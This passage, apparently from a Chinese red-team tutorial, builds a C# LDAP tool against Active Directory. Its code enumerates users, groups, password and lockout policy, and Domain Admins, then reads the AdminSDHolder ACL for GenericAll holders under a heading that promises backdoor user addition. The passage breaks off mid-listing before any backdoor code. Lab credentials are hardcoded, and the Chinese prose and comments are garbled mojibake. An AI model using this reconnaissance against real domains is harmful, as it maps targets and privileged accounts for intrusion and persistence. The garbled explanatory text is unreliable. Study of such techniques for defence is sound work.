<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Threading.Tasks;</span><br><span class="line">using System.DirectoryServices;</span><br><span class="line"></span><br><span class="line">namespace DemoLdap</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            string url = &quot;LDAP://192.168.11.16&quot;;</span><br><span class="line">            string username = &quot;hack&quot;;</span><br><span class="line">            string password = &quot;test123..&quot;;</span><br><span class="line">            DirectoryEntry coon = new DirectoryEntry(url, username, password);</span><br><span class="line">            DirectorySearcher search = new DirectorySearcher(coon);</span><br><span class="line">            search.Filter = &quot;(&amp;(objectClass=user)(objectCategory=person))&quot;;</span><br><span class="line">            foreach(SearchResult r in search.FindAll())</span><br><span class="line">            &#123;</span><br><span class="line">                string users = &quot;&quot;;</span><br><span class="line">                try</span><br><span class="line">                &#123;</span><br><span class="line">                    users = r.Properties[&quot;name&quot;][0].ToString();</span><br><span class="line">                    Console.WriteLine(users);</span><br><span class="line">                &#125;</span><br><span class="line">                catch</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(&quot;error&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>æ‰§è¡Œç»“æœä¸ºï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/filess/img2@main/2021/10/01/1633088427362-701802a0-5d39-4a47-9ce7-183415230e75.png"></p>
<h1 id="0x03-c-è·å–åŸŸå†…åŸºæœ¬ä¿¡æ¯"><a href="#0x03-c-è·å–åŸŸå†…åŸºæœ¬ä¿¡æ¯" class="headerlink" title="0x03 c#è·å–åŸŸå†…åŸºæœ¬ä¿¡æ¯"></a>0x03 c#è·å–åŸŸå†…åŸºæœ¬ä¿¡æ¯</h1><p>å‰é¢è¿æ¥å‡½æ•°å·²ç»å†™å¥½åé¢è·å–è¿™äº›åŸºæœ¬ä¿¡æ¯å°±å¾ˆç®€å•äº†ã€‚<br>â€‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public static void GetAllUsers()</span><br><span class="line">&#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        Ldapcoon.LDAP_COON();</span><br><span class="line">        Ldapcoon.search.Filter = &quot;(&amp;(objectClass=user)(objectCategory=person))&quot;;</span><br><span class="line">        Font.InfoFonts();</span><br><span class="line">        Console.WriteLine(&quot;===========All Users===========&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">        foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">        &#123;</span><br><span class="line">            string domain_users = &quot;&quot;;</span><br><span class="line">            domain_users = r.Properties[&quot;name&quot;][0].ToString();</span><br><span class="line">            Console.WriteLine(domain_users);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch</span><br><span class="line">    &#123;</span><br><span class="line">        Font.Warning();</span><br><span class="line">        Console.WriteLine(&quot;error!&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




<p>é¦–å…ˆé€šè¿‡Ldapcoonç±»çš„LDAP_COON()æ–¹æ³•è·å–åŸŸå†…èŠ‚ç‚¹coonï¼Œå’Œå¯ä»¥ç”¨æ¥æœç´¢çš„searchã€‚åŸŸå†…å°±ä¼šè¿”å›åŸŸå†…çš„DirectoryEntryå’ŒDirectorySearcherå¯¹è±¡ï¼ŒåŸŸå¤–å°±ä¼šè¿”å›åŸŸå¤–çš„DirectoryEntryå’ŒDirectorySearcherå¯¹è±¡ã€‚<br>â€‹</p>
<p>åé¢ä¸€äº›å…¶ä»–çš„å°±ä¸å†è¯¦è®²<br>â€‹</p>
<p>æŸ¥è¯¢åŸŸå†…ç»„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public static void GetAllGroups()</span><br><span class="line"> &#123;</span><br><span class="line">     try</span><br><span class="line">     &#123;</span><br><span class="line">         Ldapcoon.LDAP_COON();</span><br><span class="line">         Ldapcoon.search.Filter = &quot;(&amp;(objectCategory=group))&quot;;</span><br><span class="line">         Font.InfoFonts();</span><br><span class="line">         Console.WriteLine(&quot;===========All Groups===========&quot;);</span><br><span class="line">         Font.NormailFonts();</span><br><span class="line">         foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">         &#123;</span><br><span class="line">             string groups = &quot;&quot;;</span><br><span class="line">             string groupdescription = &quot;&quot;;</span><br><span class="line">             groups = r.Properties[&quot;cn&quot;][0].ToString();</span><br><span class="line">             Console.WriteLine(&quot;Group: &quot; + groups);</span><br><span class="line">             //groupdescription = r.Properties[&quot;description&quot;][0].ToString();</span><br><span class="line">             //Console.WriteLine(&quot;Description: &quot; + groupdescription + &quot;\r\n&quot;);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     catch</span><br><span class="line">     &#123;</span><br><span class="line">         Font.Warning();</span><br><span class="line">         Console.WriteLine(&quot;error!&quot;);</span><br><span class="line">         Font.NormailFonts();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>



<p>åŸŸå†…å¯†ç ç­–ç•¥ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">public static void GetPassPolicy()</span><br><span class="line">&#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        Ldapcoon.LDAP_COON();</span><br><span class="line">        Font.InfoFonts();</span><br><span class="line">        Console.WriteLine(&quot;===========Pass Policy===========&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">        SearchResult r = Ldapcoon.search.FindOne();</span><br><span class="line">        long maxDays = 0;</span><br><span class="line">        long minDays = 0;</span><br><span class="line">        Int64 maxPwdAge = 0;</span><br><span class="line">        Int64 minPwdAge = 0;</span><br><span class="line">        string minPwdLength = &quot;&quot;;</span><br><span class="line">        string lockoutThreshold = &quot;&quot;;</span><br><span class="line">        Int64 lockoutDuration = 0;</span><br><span class="line">        long lockTime = 0;</span><br><span class="line"></span><br><span class="line">        maxPwdAge = (Int64)r.Properties[&quot;maxPwdAge&quot;][0];</span><br><span class="line">        maxDays = maxPwdAge / -864000000000;</span><br><span class="line"></span><br><span class="line">        minPwdAge = (Int64)r.Properties[&quot;minPwdAge&quot;][0];</span><br><span class="line">        minDays = minPwdAge / -864000000000;</span><br><span class="line"></span><br><span class="line">        minPwdLength = r.Properties[&quot;minPwdLength&quot;][0].ToString();</span><br><span class="line"></span><br><span class="line">        lockoutThreshold = r.Properties[&quot;lockoutThreshold&quot;][0].ToString();</span><br><span class="line"></span><br><span class="line">        lockoutDuration = (Int64)r.Properties[&quot;lockoutDuration&quot;][0];</span><br><span class="line">        lockTime = lockoutDuration / -864000000000;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Console.WriteLine(&quot;æœ€å°ä¿®æ”¹å¯†ç æ—¶é—´:&quot; + minDays);</span><br><span class="line">        Console.WriteLine(&quot;æœ€å¤§ä¿®æ”¹å¯†ç æ—¶é—´:&quot; + maxDays);</span><br><span class="line">        Console.WriteLine(&quot;æœ€å°å¯†ç é•¿åº¦:&quot; + minPwdLength);</span><br><span class="line">        Console.WriteLine(&quot;å¤šå°‘æ¬¡é”å®š:&quot; + lockoutThreshold);</span><br><span class="line">        Console.WriteLine(&quot;é”å®šæŒç»­æ—¶é—´:&quot; + lockTime);</span><br><span class="line">    &#125;</span><br><span class="line">    catch</span><br><span class="line">    &#123;</span><br><span class="line">        Font.Warning();</span><br><span class="line">        Console.WriteLine(&quot;error!&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>åŸŸç®¡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">public static void GetAllAdmins()</span><br><span class="line">&#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        Ldapcoon.LDAP_COON();</span><br><span class="line">        Ldapcoon.search.Filter = &quot;(&amp;(objectClass=group)(cn=Domain Admins))&quot;;</span><br><span class="line">        Font.InfoFonts();</span><br><span class="line">        Console.WriteLine(&quot;===========All Domain Admins===========&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">        foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">        &#123;</span><br><span class="line">            int domain_users_count = 0;</span><br><span class="line">            string domain_users = &quot;&quot;;</span><br><span class="line">            int len = 0;</span><br><span class="line">            domain_users_count = r.Properties[&quot;member&quot;].Count;</span><br><span class="line">            while(len &lt; domain_users_count)</span><br><span class="line">            &#123;</span><br><span class="line">                domain_users = r.Properties[&quot;member&quot;][len].ToString();</span><br><span class="line">                len++;</span><br><span class="line">                if (domain_users.Contains(&quot;User&quot;))</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(domain_users);</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch</span><br><span class="line">    &#123;</span><br><span class="line">        Font.Warning();</span><br><span class="line">        Console.WriteLine(&quot;error!&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">                                           </span><br></pre></td></tr></table></figure>

<p>è¿™é‡ŒæŸ¥è¯¢åŸŸç®¡ï¼Œæˆ‘æ˜¯è¿™æ ·è¿›è¡Œå¤„ç†çš„ï¼Œæˆ‘ä»¬å…ˆé€šè¿‡ldapsearchæ¥æŸ¥çœ‹è¿”å›ç»“æœ<br>â€‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/filess/img5@main/2021/10/01/1633088452249-ac636722-4320-4a0d-bef1-3ea3d85ab70d.png"></p>
<p>ç„¶åæˆ‘è·å–memberçš„æ•°é‡ç„¶åçœ‹é‡Œé¢æ˜¯å¦åŒ…å«useræ¥è¾“å‡ºã€‚</p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="0x04-AdminSDHolderæ£€æµ‹ä¸åé—¨ç”¨æˆ·æ·»åŠ "><a href="#0x04-AdminSDHolderæ£€æµ‹ä¸åé—¨ç”¨æˆ·æ·»åŠ " class="headerlink" title="0x04 AdminSDHolderæ£€æµ‹ä¸åé—¨ç”¨æˆ·æ·»åŠ "></a>0x04 AdminSDHolderæ£€æµ‹ä¸åé—¨ç”¨æˆ·æ·»åŠ </h1><h2 id="4-1-æ£€æµ‹"><a href="#4-1-æ£€æµ‹" class="headerlink" title="4.1 æ£€æµ‹"></a>4.1 æ£€æµ‹</h2><p>AdminSDHolderæ˜¯å¯¹CN=AdminSDHolder,CN=System,DC=redteam,DC=localè¿™ä¸ªcnæ‹¥æœ‰å®Œå…¨æ§åˆ¶æƒé™çš„ç”¨æˆ·ï¼Œæˆ‘ä»¬å‰é¢è¯´åˆ°<br>â€‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public DirectorySearcher (System.DirectoryServices.DirectoryEntry searchRoot);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„searchrootå°±æ˜¯æŸ¥è¯¢çš„æ ¹åœ°å€æˆ‘ä»¬å°±éœ€è¦ç»‘å®šåˆ°CN=AdminSDHolder,CN=System,DC=redteam,DC=localè¿™é‡Œæ¥ä¹Ÿå°±æ˜¯è¯´urlä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LDAP://192.168.11.16/CN=AdminSDHolder,CN=System,DC=redteam,DC=local</span><br><span class="line">æˆ–è€…ä¸º</span><br><span class="line">LDAP://redteam/CN=AdminSDHolder,CN=System,DC=redteam,DC=local</span><br></pre></td></tr></table></figure>

<p>æ¯ä¸ªåŸŸçš„åå­—éƒ½ä¸ä¸€æ ·æ‰€ä»¥æˆ‘ä»¬è¦æ¥è·å–å¯¹è±¡çš„DC=redteam,DC=localå’Œredteamè¿™ä¸ªå€¼ã€‚<br>â€‹</p>
<p>è¿™é‡Œæˆ‘ä»¬æ¥åˆ›å»ºä¸€ä¸ªpublic_valueç±»ä¹Ÿå°±æ˜¯å…¬å…±å€¼ç±»ã€‚<br>â€‹</p>
<p>æˆ‘ä»¬é€šè¿‡adexploreræ¥å¯ä»¥çœ‹åˆ°distinguishedNameçš„å€¼å°±ä¸ºæˆ‘ä»¬éœ€è¦çš„ã€‚<br>â€‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/filess/img14@main/2021/10/01/1633088468976-fab86b78-5cf2-4087-a996-0bd9db2b4f4b.png"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°objectClassä¸ºdomainDNS.<br>â€‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/filess/img15@main/2021/10/01/1633088478583-804062c4-3827-4e72-b253-dae9bd7d5044.png"></p>
<p>æ‰€ä»¥æˆ‘ä»¬çš„filterä¸ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(objectClass=domainDNS))</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå…ˆç”¨ldapsearchæ¥è¿›è¡ŒæŸ¥è¯¢<br>â€‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/filess/img17@main/2021/10/01/1633088490189-cd528aeb-2f9d-48e4-b0c0-80e9c84d720e.png"></p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªæ–¹æ³•æ¥è·å–äº†ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//è·å–DC=redteam,DC=localè¿™ä¸ªå€¼</span><br><span class="line">public static String GetdistinguishedName()</span><br><span class="line">&#123;</span><br><span class="line">    string Domain_DNS_Name = &quot;&quot;;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        Ldapcoon.LDAP_COON();</span><br><span class="line">        Ldapcoon.search.Filter = &quot;(&amp;(objectClass=domainDNS))&quot;;</span><br><span class="line">        foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">        &#123;</span><br><span class="line">            string domainDNS_Name = &quot;&quot;;</span><br><span class="line">            domainDNS_Name = r.Properties[&quot;distinguishedName&quot;][0].ToString();</span><br><span class="line">            Domain_DNS_Name = domainDNS_Name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch</span><br><span class="line">    &#123;</span><br><span class="line">        Font.Warning();</span><br><span class="line">        Console.WriteLine(&quot;error!&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">    &#125;</span><br><span class="line">    return Domain_DNS_Name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>åŒç†</p>
<p><img src="https://cdn.jsdelivr.net/gh/filess/img19@main/2021/10/01/1633088501243-7be00078-8a63-4da1-8d33-c31640484d97.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//è·å–readteamè¿™ä¸ªå€¼</span><br><span class="line">public static String Get_Dns_First_Name()</span><br><span class="line">&#123;</span><br><span class="line">    string Dns_First_Name = &quot;&quot;;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        Ldapcoon.LDAP_COON();</span><br><span class="line">        Ldapcoon.search.Filter = &quot;(&amp;(objectClass=domainDNS))&quot;;</span><br><span class="line">        foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">        &#123;</span><br><span class="line">            string domainDC_Name = &quot;&quot;;</span><br><span class="line">            domainDC_Name = r.Properties[&quot;dc&quot;][0].ToString();</span><br><span class="line">            Dns_First_Name = domainDC_Name;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch</span><br><span class="line">    &#123;</span><br><span class="line">        Font.Warning();</span><br><span class="line">        Console.WriteLine(&quot;error!&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">    &#125;</span><br><span class="line">    return Dns_First_Name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>é‚£ä¹ˆç°åœ¨å°±å¯ä»¥ç»‘å®šadminsdholderè·¯å¾„äº†<br>â€‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">//é¦–å…ˆè·å–DC=redteam,DC=localè¿™ä¸ªå€¼</span><br><span class="line">         string distinguishedName = &quot;&quot;;</span><br><span class="line">         distinguishedName = public_value.GetdistinguishedName();</span><br><span class="line">         //ç„¶åè·å–readteamè¿™ä¸ªå€¼</span><br><span class="line">         string dc = &quot;&quot;;</span><br><span class="line">         dc = public_value.Get_Dns_First_Name();</span><br><span class="line">         if (dc != &quot;&quot; &amp;&amp; distinguishedName != &quot;&quot;)</span><br><span class="line">         &#123;</span><br><span class="line">             //è¿›è¡Œæ‹¼æ¥å¦‚æœåœ¨åŸŸå†…å¯ä»¥ç›´æ¥æ‹¼æ¥ä¸ºä»¥ä¸‹</span><br><span class="line">             //LDAP://redteam/CN=AdminSDHolder,CN=System,DC=redteam,DC=local</span><br><span class="line"></span><br><span class="line">             bool flag = public_value.isindomain();</span><br><span class="line">             string AdminSDHolder_path = &quot;&quot;;</span><br><span class="line">             if (flag)</span><br><span class="line">             &#123;</span><br><span class="line">                 AdminSDHolder_path = &quot;LDAP://&quot; + dc + &quot;/CN=AdminSDHolder,CN=System,&quot; + distinguishedName;</span><br><span class="line">             &#125;</span><br><span class="line">             else</span><br><span class="line">             &#123;</span><br><span class="line">                 AdminSDHolder_path = &quot;LDAP://&quot; + GetArgsValue.domain + &quot;/CN=AdminSDHolder,CN=System,&quot; + distinguishedName;</span><br><span class="line">             &#125;</span><br><span class="line">             Ldapcoon.coon.Path = AdminSDHolder_path;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¸ºäº†æ–¹ä¾¿æˆ‘å†™äº†ä¸ªisindomainæ”¾æ¥æ¥åˆ¤æ–­æ˜¯å¦åœ¨åŸŸå†…è¿˜æ˜¯åœ¨åŸŸå¤–<br>â€‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//åˆ¤æ–­åŸŸå†…è¿˜æ˜¯åŸŸå¤–</span><br><span class="line">public static bool isindomain()</span><br><span class="line">&#123;</span><br><span class="line">    if (GetArgsValue.user != &quot;&quot; &amp;&amp; GetArgsValue.pass != &quot;&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>æˆ‘ä»¬éœ€æ±‚å¾ˆç®€å•å°±æ˜¯è¦è·å–å“ªäº›ç”¨æˆ·å¯¹adminsdholderè¿™ä¸ªcnæ‹¥æœ‰å®Œå…¨æ§åˆ¶æƒé™ã€‚<br>â€‹</p>
<p>DirectoryEntryç±»æœ‰ä¸ªå±æ€§å«åšObjectSecurityä½œç”¨æ˜¯è·å–æˆ–è®¾ç½®æ­¤é¡¹çš„å®‰å…¨è¯´æ˜ç¬¦ã€‚è¿™ä¸ªè¯¦ç»†è¯·è‡ªè¡ŒæŸ¥çœ‹msdnã€‚<br>â€‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ActiveDirectorySecurity sec = Ldapcoon.coon.ObjectSecurity;</span><br><span class="line">           AuthorizationRuleCollection rules = null;</span><br><span class="line">           rules = sec.GetAccessRules(true, true, typeof(NTAccount));</span><br><span class="line">           foreach (ActiveDirectoryAccessRule rule in rules)</span><br><span class="line">           &#123;</span><br><span class="line">               if (rule.ActiveDirectoryRights.ToString().Equals(&quot;GenericAll&quot;))</span><br><span class="line">               &#123;</span><br><span class="line">                   string acl = rule.IdentityReference.Value;</span><br><span class="line">                   if (acl.Contains(&quot;-&quot;))</span><br><span class="line">                   &#123;</span><br><span class="line">                       //åŸŸå¤–æŸ¥è¯¢å¯èƒ½ä¼šå‡ºç°ç”¨æˆ·åä¸ºsidçš„æƒ…å†µã€‚æ‰€ä»¥éœ€è¦è½¬æ¢</span><br><span class="line">                       //Console.WriteLine(acl);</span><br><span class="line">                       string user_name = public_value.SidToUserName(acl);</span><br><span class="line">                       if(user_name != &quot;error&quot;)</span><br><span class="line">                       &#123;</span><br><span class="line">                           Console.WriteLine(user_name);</span><br><span class="line">                       &#125;  </span><br><span class="line">                   &#125;</span><br><span class="line">                   else</span><br><span class="line">                   &#123;</span><br><span class="line">                       Console.WriteLine(acl);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>

<p>è·å–åˆ°coonçš„å®‰å…¨è¯´æ˜ç¬¦åè°ƒç”¨GetAccessRulesæ–¹æ³•è·å–ä¸æŒ‡å®šçš„å®‰å…¨æ€§æ ‡è¯†ç¬¦å…³è”çš„è®¿é—®è§„åˆ™çš„é›†åˆã€‚ä¹Ÿå°±æ˜¯è¯´è·å–æˆ‘ä»¬è¿™ä¸ªèŠ‚ç‚¹çš„è§„åˆ™é›†åˆï¼Œç„¶åç”¨foreachæ¥å¾ªç¯åˆ¤æ–­ã€‚å½“ç”¨æˆ·çš„ActiveDirectoryRightsä¹Ÿå°±æ˜¯æƒé™ä¸ºGenericAllæˆ‘ä»¬å°±è¾“å‡ºå‡ºæ¥ä»–çš„åå­—ï¼Œä¹Ÿå°±æ˜¯å¯¹adminsdholderè¿™ä¸ªæ‹¥æœ‰å®Œå…¨æ§åˆ¶æƒé™çš„ç”¨æˆ·ã€‚å½“æˆ‘ä»¬åœ¨åŸŸå¤–çš„æ—¶å€™æˆ‘ä»¬è·å–åˆ°çš„ç”¨æˆ·å¯èƒ½æ˜¯sidï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦è®©sidè½¬æ¢ä¸ºåŸŸå†…ç”¨æˆ·åå­—ã€‚å½“ç„¶è¿™ä¸ªç”¨æˆ·å¯èƒ½æ˜¯ä¸€ä¸ªuserï¼Œgroupæˆ–è€…ä¸€ä¸ªcomputer<br>â€‹</p>
<p>è¿™é‡Œè°ƒç”¨äº†public_valueçš„SidToUserNameæ–¹æ³•ã€‚<br>â€‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 